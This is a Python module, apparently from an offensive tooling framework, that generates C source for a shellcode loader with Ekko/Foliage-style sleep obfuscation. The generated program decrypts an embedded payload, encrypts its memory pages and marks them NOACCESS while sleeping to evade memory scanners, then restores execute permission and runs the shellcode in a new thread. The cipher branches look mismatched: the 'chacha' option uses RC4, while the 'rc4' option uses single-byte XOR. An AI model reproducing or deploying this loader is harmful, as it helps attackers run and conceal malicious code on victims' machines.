#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""C source generator for Ekko/Foliage-style sleep memory obfuscation."""

from __future__ import annotations

from lib.compile.injection_common import InjectionBuilder
from lib.compile.syscall_evasion import _to_c_string


class SleepObfuscationBuilder(InjectionBuilder):
    def __init__(
        self,
        *,
        seed=None,
        cipher: str = "chacha",
        sleep_ms: int = 20000,
        obfuscation_key: bytes | None = None,
    ) -> None:
        super().__init__(seed=seed, cipher=cipher, sleep_ms=sleep_ms)
        self.obfuscation_key = obfuscation_key or b"\x5a"

    def build_source(self, encoded_payload: str, key: bytes, iv=None) -> str:
        xor_key = self.obfuscation_key[0] if self.obfuscation_key else 0x5A
        sleep_ms = max(1000, int(self.sleep_ms))
        headers = self.headers()
        if self.cipher == "chacha":
            headers.append('#include "rc4.h"')
        rc4_runtime = ""
        if self.cipher == "rc4":
            rc4_runtime = """
static void xor_region(PBYTE buf, SIZE_T len, BYTE k)
{
    for (SIZE_T i = 0; i < len; i++)
        buf[i] ^= k;
}
"""
        else:
            rc4_runtime = f"""
static void rc4_crypt_region(PBYTE buf, SIZE_T len)
{{
    {_to_c_string(key, "obf_key")}
    RC4(obf_key, buf, buf, len);
}}
"""

        obfuscate = (
            f"xor_region(shellcode_buf, payload_size, 0x{xor_key:02x});"
            if self.cipher == "rc4"
            else "rc4_crypt_region(shellcode_buf, payload_size);"
        )
        deobfuscate = obfuscate

        return f"""
{chr(10).join(headers)}

char* enc_payload = "{encoded_payload}";

{rc4_runtime}

/*
 * Ekko/Foliage-style delay: flip shellcode pages to NOACCESS while XOR/RC4
 * encrypted, sleep, then restore RX and execute.
 */
static void obfuscated_sleep(PBYTE buf, SIZE_T len, DWORD ms)
{{
    DWORD old = 0;
    HANDLE hTimer = NULL;
    LARGE_INTEGER due;

    if (!VirtualProtect(buf, len, PAGE_READWRITE, &old)) return;
    {obfuscate}
    VirtualProtect(buf, len, PAGE_NOACCESS, &old);

    hTimer = CreateWaitableTimerA(NULL, TRUE, NULL);
    if (hTimer)
    {{
        due.QuadPart = -((LONGLONG)ms * 10000LL);
        SetWaitableTimer(hTimer, &due, 0, NULL, NULL, FALSE);
        WaitForSingleObject(hTimer, INFINITE);
        CloseHandle(hTimer);
    }}
    else
    {{
        Sleep(ms);
    }}

    VirtualProtect(buf, len, PAGE_READWRITE, &old);
    {deobfuscate}
    VirtualProtect(buf, len, PAGE_EXECUTE_READ, &old);
    FlushInstructionCache(GetCurrentProcess(), buf, len);
}}

DWORD WINAPI run_shellcode(LPVOID param)
{{
    ((void(*)())param)();
    return 0;
}}

int main(void)
{{
{self.decode_preamble()}
{self.decrypt_block(key, iv, dest="shellcode_buf")}
    obfuscated_sleep(shellcode_buf, payload_size, {sleep_ms});
    HANDLE thread = CreateThread(NULL, 0, run_shellcode, shellcode_buf, 0, NULL);
    if (!thread) return 1;
    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);
    VirtualFree(shellcode_buf, 0, MEM_RELEASE);
    free(decoded);
    return 0;
}}
"""
